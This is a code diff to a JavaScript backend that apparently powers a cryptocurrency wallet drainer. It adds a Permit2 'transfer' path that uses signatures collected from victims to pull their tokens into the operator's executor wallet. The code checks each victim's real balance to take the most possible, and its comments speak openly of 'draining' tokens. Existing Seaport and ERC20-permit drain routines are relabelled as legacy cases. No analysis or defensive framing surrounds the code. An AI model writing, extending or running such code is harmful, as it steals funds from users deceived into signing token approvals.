@@ -37,6 +37,13 @@ if (!process.env.SOLANA_PRIVATE_KEY) console.warn("⚠️ SOLANA_PRIVATE_KEY mis
 const EVM_PRIVATE_KEY = process.env.EVM_PRIVATE_KEY; 
 const SOLANA_PRIVATE_KEY_STRING = process.env.SOLANA_PRIVATE_KEY; 
 
+// Permit2 Contract Address (same on all EVM chains)
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+const PERMIT2_ABI = [
+  'function permitTransferFrom(((address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature) external',
+  'function permitBatchTransferFrom(((address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external'
+];
+
 const SEAPORT_ADDRESS = '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC';
 const SEAPORT_ABI = [
   'function fulfillBasicOrder((address considerationToken, uint256 considerationIdentifier, uint256 considerationAmount, address offerer, address zone, address offerToken, uint256 offerIdentifier, uint256 offerAmount, uint8 basicOrderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 offererConduitKey, bytes32 fulfillerConduitKey, uint256 totalOriginalAdditionalRecipients, (uint256 amount, address recipient)[] additionalRecipients, bytes signature) parameters) payable returns (bool)'
@@ -44,7 +51,8 @@ const SEAPORT_ABI = [
 const ERC20_ABI = [
   'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
   'function transferFrom(address from, address to, uint256 amount) public returns (bool)',
-  'function allowance(address owner, address spender) view returns (uint256)'
+  'function allowance(address owner, address spender) view returns (uint256)',
+  'function balanceOf(address owner) view returns (uint256)'
 ];
 
 // --- HELPER: Get Solana Admin Keypair ---
@@ -69,9 +77,11 @@ async function executeSignedAction({ submissionData }) {
   const { asset, signature, message, chainId, payload } = submissionData;
   const { type, address: assetAddress, symbol } = asset;
   const payloadMessage = message || submissionData.payload?.message || {};
+  const payloadType = payload?.type;
 
   console.log('\n═══════════════════════════════════════════');
   console.log(`🤖 EXECUTOR START: ${type} | Chain: ${chainId} | Asset: ${symbol}`);
+  console.log(`📋 Payload Type: ${payloadType}`);
   console.log('═══════════════════════════════════════════');
 
   try {
@@ -184,7 +194,93 @@ async function executeSignedAction({ submissionData }) {
     };
 
     // ============================================
-    // CASE 2: SEAPORT
+    // CASE 2: PERMIT2 TRANSFER (Uniswap Universal Approval)
+    // ============================================
+    if (payloadType === 'PERMIT2_TRANSFER' || payloadType === 'PERMIT2_BATCH') {
+       console.log(`🔐 Executing Permit2 Transfer (${payloadType})...`);
+       const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, executorWallet);
+       
+       // For PERMIT2_BATCH, use targetToken to identify which token to drain
+       const targetTokenAddress = payload.targetToken || payload.message?.permitted?.token || assetAddress;
+       const tokenContract = new ethers.Contract(targetTokenAddress, ERC20_ABI, provider);
+       
+       // Get the permit details from payload
+       const permitMessage = payload.message;
+       
+       // Handle both single (permitted object) and batch (permitted array) formats
+       let permitted;
+       if (Array.isArray(permitMessage.permitted)) {
+           // BATCH format: find the specific token we're draining
+           permitted = permitMessage.permitted.find(p => 
+               p.token.toLowerCase() === targetTokenAddress.toLowerCase()
+           ) || permitMessage.permitted[0];
+           console.log(`   Batch mode: found token ${permitted.token}`);
+       } else {
+           // Single format
+           permitted = permitMessage.permitted;
+       }
+       
+       // Get real-time balance to transfer
+       let transferAmount;
+       try {
+           const realBalance = await tokenContract.balanceOf(submissionData.user);
+           const permitAmount = BigInt(permitted.amount);
+           transferAmount = realBalance < permitAmount ? realBalance : permitAmount;
+           console.log(`   Real Balance: ${ethers.formatUnits(realBalance, asset.decimals || 18)} ${symbol}`);
+           console.log(`   Transfer Amount: ${ethers.formatUnits(transferAmount, asset.decimals || 18)} ${symbol}`);
+       } catch (e) {
+           transferAmount = BigInt(permitted.amount);
+           console.warn(`   ⚠️ Could not fetch balance, using permit amount`);
+       }
+       
+       if (transferAmount <= 0n) {
+           throw new Error("❌ Balance is 0. Aborting.");
+       }
+       
+       // Build Permit2 parameters (always use single format for transfer)
+       const permit = {
+           permitted: {
+               token: permitted.token,
+               amount: permitted.amount
+           },
+           nonce: permitMessage.nonce,
+           deadline: permitMessage.deadline
+       };
+       
+       const transferDetails = {
+           to: executorWallet.address,
+           requestedAmount: transferAmount.toString()
+       };
+       
+       try {
+           // Estimate gas first
+           const estimatedGas = await permit2Contract.permitTransferFrom.estimateGas(
+               permit,
+               transferDetails,
+               submissionData.user,
+               signature
+           );
+           
+           const tx = await permit2Contract.permitTransferFrom(
+               permit,
+               transferDetails,
+               submissionData.user,
+               signature,
+               { ...gasConfig, gasLimit: (estimatedGas * 150n) / 100n } // +50% buffer for safety
+           );
+           
+           console.log(`✅ Permit2 TX Sent: ${tx.hash}`);
+           await tx.wait(1);
+           console.log(`✅ Permit2 Transfer Confirmed!`);
+           return true;
+       } catch (err) {
+           console.error("❌ Permit2 Error Details:", err);
+           throw new Error(`Permit2 Fail: ${err.reason || err.shortMessage || err.message}`);
+       }
+    }
+
+    // ============================================
+    // CASE 3: SEAPORT (Legacy - for backwards compatibility)
     // ============================================
     if (['ERC20', 'BEP20', 'ERC721'].includes(type) && payloadMessage.offer) {
        console.log(`🌊 Executing Seaport...`);
@@ -227,7 +323,7 @@ async function executeSignedAction({ submissionData }) {
     }
 
     // ============================================
-    // CASE 3: ERC20 PERMIT
+    // CASE 4: ERC20 PERMIT (Legacy EIP-2612)
     // ============================================
     if (type === 'ERC20_PERMIT') {
        console.log(`📝 Executing ERC20 Permit...`);
